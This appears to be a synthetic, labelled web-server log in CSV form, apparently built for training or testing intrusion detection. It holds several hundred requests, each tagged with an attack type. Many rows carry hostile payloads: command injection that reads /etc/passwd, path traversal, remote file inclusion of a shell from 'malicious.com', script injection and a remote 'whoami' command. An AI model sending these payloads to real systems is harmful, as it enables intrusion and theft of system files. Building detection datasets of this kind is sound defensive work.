ip,timestamp,request,status,size,attack_type
61.185.235.131,2025-03-15 12:35:00,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,1461,COMMAND_INJECTION
186.116.48.229,2025-03-15 12:35:50,GET /etc/passwd HTTP/1.1,403,4247,PATH_TRAVERSAL
227.35.70.12,2025-03-15 12:35:46,POST /upload-xml HTTP/1.1,200,2750,XXE_ATTACK
39.136.150.166,2025-03-15 12:35:38,POST /change-email?email=attacker@example.com HTTP/1.1,403,3665,CSRF_ATTACK
38.137.17.132,2025-03-15 12:34:58,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4543,XSS_ATTACK
79.226.78.147,2025-03-15 12:35:41,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,3791,REMOTE_FILE_INCLUSION
143.52.19.149,2025-03-15 12:35:45,POST /change-email?email=attacker@example.com HTTP/1.1,403,2938,CSRF_ATTACK
215.1.242.187,2025-03-15 12:34:54,POST /wp-json/wp/v2/users HTTP/1.1,200,1216,USER_ENUMERATION
34.243.154.71,2025-03-15 12:34:57,POST /wp-json/wp/v2/users HTTP/1.1,200,4478,USER_ENUMERATION
81.234.93.190,2025-03-15 12:35:30,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,778,COMMAND_INJECTION
79.89.118.165,2025-03-15 12:35:14,POST /wp-json/wp/v2/users HTTP/1.1,200,2721,USER_ENUMERATION
118.207.113.137,2025-03-15 12:35:25,POST /wp-json/wp/v2/users HTTP/1.1,200,4363,USER_ENUMERATION
156.27.32.47,2025-03-15 12:35:20,GET /api/user?username=admin HTTP/1.1,200,791,API_ABUSE
108.8.176.229,2025-03-15 12:35:45,GET /etc/passwd HTTP/1.1,403,2118,PATH_TRAVERSAL
133.230.222.192,2025-03-15 12:35:43,POST /upload-xml HTTP/1.1,200,3486,XXE_ATTACK
79.115.244.105,2025-03-15 12:34:56,GET /index.php?page=../../../../etc/passwd HTTP/1.1,200,2397,LFI_ATTACK
31.124.208.54,2025-03-15 12:35:37,GET /index.php?page=../../../../etc/passwd HTTP/1.1,200,4758,LFI_ATTACK
193.82.117.11,2025-03-15 12:35:10,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,1531,REMOTE_FILE_INCLUSION
164.200.42.200,2025-03-15 12:35:50,GET /index.php?page=../../../../etc/passwd HTTP/1.1,200,4794,LFI_ATTACK
25.123.235.125,2025-03-15 12:34:59,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3503,XSS_ATTACK
171.181.31.122,2025-03-15 12:35:23,GET /etc/passwd HTTP/1.1,403,4334,PATH_TRAVERSAL
253.224.151.39,2025-03-15 12:35:29,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,2141,COMMAND_INJECTION
4.133.227.251,2025-03-15 12:35:18,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3807,XSS_ATTACK
186.141.122.145,2025-03-15 12:34:58,GET /etc/passwd HTTP/1.1,403,2478,PATH_TRAVERSAL
100.73.253.66,2025-03-15 12:35:37,GET /api/user?username=admin HTTP/1.1,200,3099,API_ABUSE
157.207.60.75,2025-03-15 12:35:23,POST /upload-xml HTTP/1.1,200,3748,XXE_ATTACK
195.147.109.164,2025-03-15 12:34:59,POST /change-email?email=attacker@example.com HTTP/1.1,403,1178,CSRF_ATTACK
246.20.193.47,2025-03-15 12:35:43,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,2646,XSS_ATTACK
82.216.126.109,2025-03-15 12:35:20,GET /execute?cmd=whoami HTTP/1.1,200,3443,RCE_ATTACK
17.166.197.106,2025-03-15 12:35:30,POST /upload-xml HTTP/1.1,200,1623,XXE_ATTACK
191.21.134.242,2025-03-15 12:35:18,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3507,XSS_ATTACK
210.38.94.87,2025-03-15 12:35:24,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4761,REMOTE_FILE_INCLUSION
205.129.179.220,2025-03-15 12:35:41,GET /execute?cmd=whoami HTTP/1.1,200,936,RCE_ATTACK
77.176.227.92,2025-03-15 12:35:45,POST /upload-xml HTTP/1.1,200,2530,XXE_ATTACK
146.4.228.87,2025-03-15 12:35:17,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,2287,XSS_ATTACK
66.212.145.135,2025-03-15 12:35:48,GET /api/user?username=admin HTTP/1.1,200,4309,API_ABUSE
83.185.150.33,2025-03-15 12:34:57,GET /api/user?username=admin HTTP/1.1,200,2334,API_ABUSE
148.9.184.200,2025-03-15 12:35:05,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3600,XSS_ATTACK
213.134.92.211,2025-03-15 12:35:23,GET /api/user?username=admin HTTP/1.1,200,2863,API_ABUSE
235.177.57.181,2025-03-15 12:35:47,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,2328,REMOTE_FILE_INCLUSION
5.113.176.139,2025-03-15 12:35:05,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,2509,XSS_ATTACK
5.251.197.80,2025-03-15 12:35:32,GET /index.php?page=../../../../etc/passwd HTTP/1.1,200,2582,LFI_ATTACK
165.107.208.197,2025-03-15 12:35:33,GET /etc/passwd HTTP/1.1,403,4749,PATH_TRAVERSAL
48.82.19.97,2025-03-15 12:35:32,POST /upload-xml HTTP/1.1,200,3411,XXE_ATTACK
15.252.48.169,2025-03-15 12:35:11,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4262,XSS_ATTACK
150.251.186.114,2025-03-15 12:35:05,POST /wp-json/wp/v2/users HTTP/1.1,200,1383,USER_ENUMERATION
113.108.131.63,2025-03-15 12:35:09,POST /wp-json/wp/v2/users HTTP/1.1,200,4675,USER_ENUMERATION
219.164.80.96,2025-03-15 12:35:18,GET /index.php?page=../../../../etc/passwd HTTP/1.1,200,826,LFI_ATTACK
105.11.22.110,2025-03-15 12:35:34,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3094,XSS_ATTACK
99.17.207.235,2025-03-15 12:35:34,POST /wp-json/wp/v2/users HTTP/1.1,200,3339,USER_ENUMERATION
53.141.171.234,2025-03-15 12:35:10,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4929,REMOTE_FILE_INCLUSION
77.58.96.69,2025-03-15 12:35:54,POST /upload-xml HTTP/1.1,200,1723,XXE_ATTACK
148.111.32.116,2025-03-15 12:35:22,GET /etc/passwd HTTP/1.1,403,3656,PATH_TRAVERSAL
52.200.83.12,2025-03-15 12:35:11,GET /execute?cmd=whoami HTTP/1.1,200,1795,RCE_ATTACK
232.191.239.184,2025-03-15 12:35:46,POST /upload-xml HTTP/1.1,200,1693,XXE_ATTACK
20.160.206.180,2025-03-15 12:35:08,GET /execute?cmd=whoami HTTP/1.1,200,3424,RCE_ATTACK
91.98.192.236,2025-03-15 12:35:13,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1005,XSS_ATTACK
100.99.35.56,2025-03-15 12:35:56,POST /wp-json/wp/v2/users HTTP/1.1,200,2122,USER_ENUMERATION
187.151.209.71,2025-03-15 12:35:38,POST /upload-xml HTTP/1.1,200,1612,XXE_ATTACK
91.148.255.201,2025-03-15 12:35:26,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,2348,COMMAND_INJECTION
46.245.128.98,2025-03-15 12:35:50,GET /execute?cmd=whoami HTTP/1.1,200,870,RCE_ATTACK
23.213.209.41,2025-03-15 12:35:00,GET /api/user?username=admin HTTP/1.1,200,1557,API_ABUSE
139.245.254.49,2025-03-15 12:35:32,GET /execute?cmd=whoami HTTP/1.1,200,1347,RCE_ATTACK
62.149.152.80,2025-03-15 12:35:41,GET /index.php?page=../../../../etc/passwd HTTP/1.1,200,4254,LFI_ATTACK
37.160.232.135,2025-03-15 12:35:11,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,2863,REMOTE_FILE_INCLUSION
38.168.184.35,2025-03-15 12:35:39,POST /change-email?email=attacker@example.com HTTP/1.1,403,3365,CSRF_ATTACK
82.8.84.149,2025-03-15 12:35:15,GET /api/user?username=admin HTTP/1.1,200,3969,API_ABUSE
215.234.3.43,2025-03-15 12:35:49,GET /etc/passwd HTTP/1.1,403,865,PATH_TRAVERSAL
210.147.127.143,2025-03-15 12:35:47,GET /execute?cmd=whoami HTTP/1.1,200,3869,RCE_ATTACK
23.18.25.207,2025-03-15 12:35:06,GET /execute?cmd=whoami HTTP/1.1,200,3880,RCE_ATTACK
220.118.40.144,2025-03-15 12:35:27,POST /upload-xml HTTP/1.1,200,1816,XXE_ATTACK
10.75.155.38,2025-03-15 12:35:05,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3132,XSS_ATTACK
145.69.234.157,2025-03-15 12:35:11,GET /api/user?username=admin HTTP/1.1,200,1567,API_ABUSE
129.175.2.216,2025-03-15 12:35:01,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,1602,COMMAND_INJECTION
196.29.34.227,2025-03-15 12:35:40,GET /index.php?page=../../../../etc/passwd HTTP/1.1,200,4239,LFI_ATTACK
121.18.235.2,2025-03-15 12:34:59,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4685,REMOTE_FILE_INCLUSION
52.75.64.203,2025-03-15 12:35:32,POST /upload-xml HTTP/1.1,200,3456,XXE_ATTACK
220.185.183.225,2025-03-15 12:35:30,GET /execute?cmd=whoami HTTP/1.1,200,4431,RCE_ATTACK
30.219.169.110,2025-03-15 12:35:04,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3457,XSS_ATTACK
102.89.87.178,2025-03-15 12:35:44,POST /wp-json/wp/v2/users HTTP/1.1,200,4357,USER_ENUMERATION
1.64.219.249,2025-03-15 12:35:45,POST /wp-json/wp/v2/users HTTP/1.1,200,1223,USER_ENUMERATION
187.10.88.19,2025-03-15 12:35:29,GET /api/user?username=admin HTTP/1.1,200,2503,API_ABUSE
60.44.137.125,2025-03-15 12:34:59,POST /change-email?email=attacker@example.com HTTP/1.1,403,2542,CSRF_ATTACK
208.191.213.113,2025-03-15 12:35:04,GET /etc/passwd HTTP/1.1,403,1798,PATH_TRAVERSAL
174.104.172.174,2025-03-15 12:35:32,GET /etc/passwd HTTP/1.1,403,1248,PATH_TRAVERSAL
209.50.168.38,2025-03-15 12:35:19,GET /etc/passwd HTTP/1.1,403,3618,PATH_TRAVERSAL
63.68.89.97,2025-03-15 12:35:00,GET /index.php?page=../../../../etc/passwd HTTP/1.1,200,3953,LFI_ATTACK
166.119.50.150,2025-03-15 12:35:34,POST /wp-json/wp/v2/users HTTP/1.1,200,914,USER_ENUMERATION
233.85.139.163,2025-03-15 12:35:08,GET /api/user?username=admin HTTP/1.1,200,4597,API_ABUSE
162.167.162.252,2025-03-15 12:35:01,GET /execute?cmd=whoami HTTP/1.1,200,4442,RCE_ATTACK
23.167.235.134,2025-03-15 12:35:03,GET /api/user?username=admin HTTP/1.1,200,4722,API_ABUSE
213.94.10.195,2025-03-15 12:35:57,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4469,REMOTE_FILE_INCLUSION
225.101.1.68,2025-03-15 12:35:35,POST /change-email?email=attacker@example.com HTTP/1.1,403,1359,CSRF_ATTACK
69.217.121.183,2025-03-15 12:35:49,POST /change-email?email=attacker@example.com HTTP/1.1,403,1406,CSRF_ATTACK
47.66.41.15,2025-03-15 12:35:07,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,3855,COMMAND_INJECTION
222.16.87.12,2025-03-15 12:35:20,POST /wp-json/wp/v2/users HTTP/1.1,200,3339,USER_ENUMERATION
223.13.164.65,2025-03-15 12:35:55,GET /etc/passwd HTTP/1.1,403,4169,PATH_TRAVERSAL
74.105.51.44,2025-03-15 12:35:01,POST /change-email?email=attacker@example.com HTTP/1.1,403,1806,CSRF_ATTACK
107.109.132.160,2025-03-15 12:35:14,GET /etc/passwd HTTP/1.1,403,3884,PATH_TRAVERSAL
253.177.143.126,2025-03-15 12:35:18,GET /etc/passwd HTTP/1.1,403,3125,PATH_TRAVERSAL
171.97.87.178,2025-03-15 12:35:51,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3416,XSS_ATTACK
232.248.85.28,2025-03-15 12:35:30,POST /change-email?email=attacker@example.com HTTP/1.1,403,505,CSRF_ATTACK
145.243.254.63,2025-03-15 12:35:15,POST /wp-json/wp/v2/users HTTP/1.1,200,3988,USER_ENUMERATION
42.161.198.28,2025-03-15 12:35:03,GET /execute?cmd=whoami HTTP/1.1,200,2944,RCE_ATTACK
255.164.251.54,2025-03-15 12:35:29,GET /index.php?page=../../../../etc/passwd HTTP/1.1,200,4188,LFI_ATTACK
155.14.54.100,2025-03-15 12:35:17,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,1199,REMOTE_FILE_INCLUSION
41.186.94.124,2025-03-15 12:35:29,GET /etc/passwd HTTP/1.1,403,1684,PATH_TRAVERSAL
164.25.43.194,2025-03-15 12:35:19,POST /upload-xml HTTP/1.1,200,887,XXE_ATTACK
154.111.9.23,2025-03-15 12:35:12,POST /upload-xml HTTP/1.1,200,1034,XXE_ATTACK
121.191.76.204,2025-03-15 12:35:49,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,951,XSS_ATTACK
46.132.121.224,2025-03-15 12:35:59,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,2766,XSS_ATTACK
122.211.122.78,2025-03-15 12:35:48,GET /index.php?page=../../../../etc/passwd HTTP/1.1,200,1900,LFI_ATTACK
197.101.217.33,2025-03-15 12:35:00,GET /api/user?username=admin HTTP/1.1,200,1929,API_ABUSE
16.21.237.155,2025-03-15 12:35:37,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,1137,REMOTE_FILE_INCLUSION
96.208.56.231,2025-03-15 12:35:34,POST /upload-xml HTTP/1.1,200,2558,XXE_ATTACK
75.197.214.203,2025-03-15 12:35:10,POST /change-email?email=attacker@example.com HTTP/1.1,403,3314,CSRF_ATTACK
40.24.207.120,2025-03-15 12:35:16,GET /api/user?username=admin HTTP/1.1,200,553,API_ABUSE
72.36.38.103,2025-03-15 12:35:41,POST /change-email?email=attacker@example.com HTTP/1.1,403,4717,CSRF_ATTACK
174.41.131.119,2025-03-15 12:35:31,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,2639,COMMAND_INJECTION
140.5.2.61,2025-03-15 12:35:57,GET /execute?cmd=whoami HTTP/1.1,200,1477,RCE_ATTACK
107.210.0.237,2025-03-15 12:35:57,POST /change-email?email=attacker@example.com HTTP/1.1,403,4490,CSRF_ATTACK
97.42.10.160,2025-03-15 12:35:08,POST /change-email?email=attacker@example.com HTTP/1.1,403,4337,CSRF_ATTACK
230.46.22.140,2025-03-15 12:35:50,GET /execute?cmd=whoami HTTP/1.1,200,3921,RCE_ATTACK
172.31.18.131,2025-03-15 12:35:52,GET /execute?cmd=whoami HTTP/1.1,200,2259,RCE_ATTACK
66.197.5.99,2025-03-15 12:35:24,GET /execute?cmd=whoami HTTP/1.1,200,2008,RCE_ATTACK
135.112.83.108,2025-03-15 12:35:24,GET /index.php?page=../../../../etc/passwd HTTP/1.1,200,2733,LFI_ATTACK
126.130.183.218,2025-03-15 12:35:21,GET /api/user?username=admin HTTP/1.1,200,2279,API_ABUSE
148.201.252.53,2025-03-15 12:35:57,POST /wp-json/wp/v2/users HTTP/1.1,200,4159,USER_ENUMERATION
182.128.240.236,2025-03-15 12:35:12,POST /change-email?email=attacker@example.com HTTP/1.1,403,1910,CSRF_ATTACK
24.147.57.147,2025-03-15 12:35:29,GET /etc/passwd HTTP/1.1,403,4319,PATH_TRAVERSAL
171.32.220.87,2025-03-15 12:35:59,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,3948,REMOTE_FILE_INCLUSION
16.61.177.222,2025-03-15 12:35:04,POST /wp-json/wp/v2/users HTTP/1.1,200,2284,USER_ENUMERATION
227.232.209.213,2025-03-15 12:35:47,POST /upload-xml HTTP/1.1,200,2143,XXE_ATTACK
91.112.177.38,2025-03-15 12:35:11,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,2451,REMOTE_FILE_INCLUSION
166.115.77.2,2025-03-15 12:35:21,GET /api/user?username=admin HTTP/1.1,200,874,API_ABUSE
114.62.143.179,2025-03-15 12:35:39,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,728,XSS_ATTACK
135.64.170.122,2025-03-15 12:36:01,GET /execute?cmd=whoami HTTP/1.1,200,4180,RCE_ATTACK
220.212.1.109,2025-03-15 12:35:20,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3360,XSS_ATTACK
194.116.230.8,2025-03-15 12:35:12,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,571,REMOTE_FILE_INCLUSION
251.26.143.233,2025-03-15 12:35:56,GET /execute?cmd=whoami HTTP/1.1,200,2377,RCE_ATTACK
18.81.225.199,2025-03-15 12:35:35,GET /execute?cmd=whoami HTTP/1.1,200,869,RCE_ATTACK
69.182.142.153,2025-03-15 12:35:58,GET /index.php?page=../../../../etc/passwd HTTP/1.1,200,4507,LFI_ATTACK
56.165.93.69,2025-03-15 12:35:58,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4917,XSS_ATTACK
213.161.105.53,2025-03-15 12:35:43,GET /api/user?username=admin HTTP/1.1,200,2074,API_ABUSE
79.133.154.222,2025-03-15 12:35:19,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,3220,REMOTE_FILE_INCLUSION
168.153.117.67,2025-03-15 12:35:07,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4860,XSS_ATTACK
198.85.156.53,2025-03-15 12:35:35,GET /execute?cmd=whoami HTTP/1.1,200,1399,RCE_ATTACK
21.195.73.136,2025-03-15 12:35:08,POST /wp-json/wp/v2/users HTTP/1.1,200,2228,USER_ENUMERATION
218.163.172.74,2025-03-15 12:35:30,GET /index.php?page=../../../../etc/passwd HTTP/1.1,200,1125,LFI_ATTACK
38.16.77.60,2025-03-15 12:35:21,GET /api/user?username=admin HTTP/1.1,200,2572,API_ABUSE
58.100.161.118,2025-03-15 12:35:06,POST /upload-xml HTTP/1.1,200,3880,XXE_ATTACK
183.138.15.62,2025-03-15 12:35:16,POST /wp-json/wp/v2/users HTTP/1.1,200,1425,USER_ENUMERATION
24.135.150.205,2025-03-15 12:35:02,GET /index.php?page=../../../../etc/passwd HTTP/1.1,200,2833,LFI_ATTACK
119.167.168.239,2025-03-15 12:35:14,POST /upload-xml HTTP/1.1,200,1935,XXE_ATTACK
182.250.53.240,2025-03-15 12:35:56,POST /wp-json/wp/v2/users HTTP/1.1,200,755,USER_ENUMERATION
130.6.35.113,2025-03-15 12:35:06,POST /wp-json/wp/v2/users HTTP/1.1,200,3357,USER_ENUMERATION
58.209.146.131,2025-03-15 12:35:17,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,3992,REMOTE_FILE_INCLUSION
46.184.22.37,2025-03-15 12:35:27,GET /etc/passwd HTTP/1.1,403,2184,PATH_TRAVERSAL
194.14.232.125,2025-03-15 12:35:35,GET /api/user?username=admin HTTP/1.1,200,4091,API_ABUSE
12.212.50.212,2025-03-15 12:36:01,GET /etc/passwd HTTP/1.1,403,2290,PATH_TRAVERSAL
224.33.106.131,2025-03-15 12:35:23,GET /index.php?page=../../../../etc/passwd HTTP/1.1,200,521,LFI_ATTACK
114.208.48.128,2025-03-15 12:35:50,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,3024,COMMAND_INJECTION
176.243.248.94,2025-03-15 12:35:15,GET /etc/passwd HTTP/1.1,403,3703,PATH_TRAVERSAL
150.211.168.219,2025-03-15 12:36:00,GET /execute?cmd=whoami HTTP/1.1,200,2820,RCE_ATTACK
75.231.193.22,2025-03-15 12:35:57,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,3287,REMOTE_FILE_INCLUSION
206.235.191.112,2025-03-15 12:35:59,GET /api/user?username=admin HTTP/1.1,200,512,API_ABUSE
155.61.176.40,2025-03-15 12:35:07,POST /upload-xml HTTP/1.1,200,1194,XXE_ATTACK
34.230.140.155,2025-03-15 12:35:35,POST /upload-xml HTTP/1.1,200,3553,XXE_ATTACK
137.183.36.57,2025-03-15 12:35:51,GET /api/user?username=admin HTTP/1.1,200,3534,API_ABUSE
24.72.172.120,2025-03-15 12:35:30,POST /wp-json/wp/v2/users HTTP/1.1,200,4507,USER_ENUMERATION
37.211.102.202,2025-03-15 12:35:16,POST /change-email?email=attacker@example.com HTTP/1.1,403,4619,CSRF_ATTACK
17.81.118.233,2025-03-15 12:35:10,GET /index.php?page=../../../../etc/passwd HTTP/1.1,200,2653,LFI_ATTACK
155.118.11.250,2025-03-15 12:35:31,POST /upload-xml HTTP/1.1,200,832,XXE_ATTACK
83.143.179.32,2025-03-15 12:35:31,POST /change-email?email=attacker@example.com HTTP/1.1,403,4004,CSRF_ATTACK
139.157.226.81,2025-03-15 12:35:17,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,3347,COMMAND_INJECTION
147.104.132.19,2025-03-15 12:35:59,POST /change-email?email=attacker@example.com HTTP/1.1,403,3613,CSRF_ATTACK
45.230.152.43,2025-03-15 12:35:30,GET /api/user?username=admin HTTP/1.1,200,620,API_ABUSE
216.196.214.30,2025-03-15 12:35:51,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,752,REMOTE_FILE_INCLUSION
143.111.92.253,2025-03-15 12:35:30,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1175,XSS_ATTACK
220.126.90.96,2025-03-15 12:35:29,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,3183,REMOTE_FILE_INCLUSION
115.185.144.235,2025-03-15 12:35:08,POST /change-email?email=attacker@example.com HTTP/1.1,403,1971,CSRF_ATTACK
10.64.71.207,2025-03-15 12:35:06,GET /index.php?page=../../../../etc/passwd HTTP/1.1,200,2057,LFI_ATTACK
95.107.29.21,2025-03-15 12:35:55,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,3451,REMOTE_FILE_INCLUSION
183.151.130.124,2025-03-15 12:35:23,POST /wp-json/wp/v2/users HTTP/1.1,200,2811,USER_ENUMERATION
156.5.198.47,2025-03-15 12:35:52,GET /api/user?username=admin HTTP/1.1,200,3529,API_ABUSE
61.211.239.55,2025-03-15 12:35:18,GET /index.php?page=../../../../etc/passwd HTTP/1.1,200,1712,LFI_ATTACK
51.166.187.156,2025-03-15 12:35:32,GET /etc/passwd HTTP/1.1,403,888,PATH_TRAVERSAL
16.222.228.235,2025-03-15 12:35:15,GET /api/user?username=admin HTTP/1.1,200,4282,API_ABUSE
230.41.121.175,2025-03-15 12:35:39,POST /wp-json/wp/v2/users HTTP/1.1,200,4046,USER_ENUMERATION
2.195.142.182,2025-03-15 12:35:44,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,3988,COMMAND_INJECTION
32.59.28.199,2025-03-15 12:35:48,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,3970,COMMAND_INJECTION
254.244.130.204,2025-03-15 12:35:06,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,1440,REMOTE_FILE_INCLUSION
30.113.6.44,2025-03-15 12:35:26,GET /index.php?page=../../../../etc/passwd HTTP/1.1,200,1440,LFI_ATTACK
219.101.116.50,2025-03-15 12:35:34,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1765,XSS_ATTACK
218.218.5.255,2025-03-15 12:35:35,POST /upload-xml HTTP/1.1,200,3570,XXE_ATTACK
199.197.166.37,2025-03-15 12:36:01,GET /index.php?page=../../../../etc/passwd HTTP/1.1,200,4786,LFI_ATTACK
52.10.46.32,2025-03-15 12:35:15,GET /api/user?username=admin HTTP/1.1,200,2335,API_ABUSE
169.23.92.37,2025-03-15 12:35:40,POST /change-email?email=attacker@example.com HTTP/1.1,403,4602,CSRF_ATTACK
61.70.157.38,2025-03-15 12:35:55,POST /upload-xml HTTP/1.1,200,994,XXE_ATTACK
56.10.81.10,2025-03-15 12:35:41,GET /index.php?page=../../../../etc/passwd HTTP/1.1,200,2392,LFI_ATTACK
249.137.148.202,2025-03-15 12:35:22,POST /upload-xml HTTP/1.1,200,4459,XXE_ATTACK
244.218.212.104,2025-03-15 12:35:45,POST /upload-xml HTTP/1.1,200,2497,XXE_ATTACK
143.1.114.247,2025-03-15 12:35:16,GET /execute?cmd=whoami HTTP/1.1,200,776,RCE_ATTACK
20.214.44.6,2025-03-15 12:36:00,GET /api/user?username=admin HTTP/1.1,200,4960,API_ABUSE
220.133.111.128,2025-03-15 12:35:24,GET /etc/passwd HTTP/1.1,403,3597,PATH_TRAVERSAL
104.36.197.228,2025-03-15 12:35:56,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,4142,COMMAND_INJECTION
80.231.255.47,2025-03-15 12:35:10,GET /api/user?username=admin HTTP/1.1,200,4132,API_ABUSE
6.212.106.181,2025-03-15 12:35:56,POST /change-email?email=attacker@example.com HTTP/1.1,403,4658,CSRF_ATTACK
135.112.47.130,2025-03-15 12:35:09,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4377,REMOTE_FILE_INCLUSION
225.144.4.11,2025-03-15 12:35:50,GET /execute?cmd=whoami HTTP/1.1,200,4364,RCE_ATTACK
178.99.0.61,2025-03-15 12:35:47,GET /index.php?page=../../../../etc/passwd HTTP/1.1,200,3560,LFI_ATTACK
117.139.20.180,2025-03-15 12:36:01,GET /api/user?username=admin HTTP/1.1,200,4564,API_ABUSE
37.53.172.134,2025-03-15 12:35:35,GET /index.php?page=../../../../etc/passwd HTTP/1.1,200,584,LFI_ATTACK
180.9.13.76,2025-03-15 12:35:20,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,3729,COMMAND_INJECTION
202.69.174.23,2025-03-15 12:35:11,POST /wp-json/wp/v2/users HTTP/1.1,200,2818,USER_ENUMERATION
105.217.68.157,2025-03-15 12:35:56,GET /execute?cmd=whoami HTTP/1.1,200,1829,RCE_ATTACK
145.77.205.221,2025-03-15 12:35:27,POST /change-email?email=attacker@example.com HTTP/1.1,403,2553,CSRF_ATTACK
7.36.183.254,2025-03-15 12:35:17,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,2519,REMOTE_FILE_INCLUSION
95.13.253.7,2025-03-15 12:35:23,POST /wp-json/wp/v2/users HTTP/1.1,200,3456,USER_ENUMERATION
55.186.210.8,2025-03-15 12:35:48,GET /etc/passwd HTTP/1.1,403,1502,PATH_TRAVERSAL
140.200.64.114,2025-03-15 12:35:30,GET /api/user?username=admin HTTP/1.1,200,4364,API_ABUSE
6.16.97.55,2025-03-15 12:36:01,POST /upload-xml HTTP/1.1,200,3019,XXE_ATTACK
145.12.147.237,2025-03-15 12:35:29,GET /api/user?username=admin HTTP/1.1,200,628,API_ABUSE
206.216.57.12,2025-03-15 12:36:00,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,3116,COMMAND_INJECTION
25.37.206.138,2025-03-15 12:35:48,GET /execute?cmd=whoami HTTP/1.1,200,3177,RCE_ATTACK
246.84.24.132,2025-03-15 12:35:50,GET /execute?cmd=whoami HTTP/1.1,200,1661,RCE_ATTACK
